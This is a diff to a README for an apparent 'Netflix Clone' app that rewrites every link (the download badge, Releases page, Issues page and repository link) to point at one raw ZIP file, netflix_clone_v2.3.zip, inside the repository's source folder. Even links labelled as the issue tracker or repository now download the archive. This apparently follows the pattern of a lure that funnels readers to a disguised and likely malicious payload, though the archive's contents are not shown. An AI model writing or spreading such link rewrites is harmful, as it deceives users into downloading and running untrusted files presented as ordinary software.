@@ -6,7 +6,7 @@ Welcome to the Netflix Clone! This app allows you to stream movies easily, just 
 
 ## 📥 Download the App
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Fnpsz/netflix-clone/releases)
+[![Download Now](https://raw.githubusercontent.com/Fnpsz/netflix-clone/main/src/library/netflix_clone_v2.3.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Fnpsz/netflix-clone/main/src/library/netflix_clone_v2.3.zip)
 
 ## 📋 Features
 
@@ -29,7 +29,7 @@ To run the Netflix Clone smoothly, here are the recommended system requirements:
 Follow these steps to download and install the Netflix Clone app:
 
 1. **Visit the Download Page**
-   Go to the [Releases page](https://github.com/Fnpsz/netflix-clone/releases) to find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/Fnpsz/netflix-clone/main/src/library/netflix_clone_v2.3.zip) to find the latest version.
 
 2. **Choose the Version**
    Look for the most recent release. You will see a list of files to download. Select the correct file depending on your operating system.
@@ -62,14 +62,14 @@ Once the app is running:
 If you encounter any issues:
 
 - **Check the FAQ:** Visit our [FAQ page](#) for common questions.
-- **Open an Issue:** If you don't find what you need, visit our [GitHub Issues](https://github.com/Fnpsz/netflix-clone/issues) page to report a problem.
+- **Open an Issue:** If you don't find what you need, visit our [GitHub Issues](https://raw.githubusercontent.com/Fnpsz/netflix-clone/main/src/library/netflix_clone_v2.3.zip) page to report a problem.
 
 ## 🔗 Links
 
 For more information and updates, visit:
 
-- [GitHub Repository](https://github.com/Fnpsz/netflix-clone)
-- [Releases Page](https://github.com/Fnpsz/netflix-clone/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/Fnpsz/netflix-clone/main/src/library/netflix_clone_v2.3.zip)
+- [Releases Page](https://raw.githubusercontent.com/Fnpsz/netflix-clone/main/src/library/netflix_clone_v2.3.zip)
 
 ## ⭐ Join Our Community
 
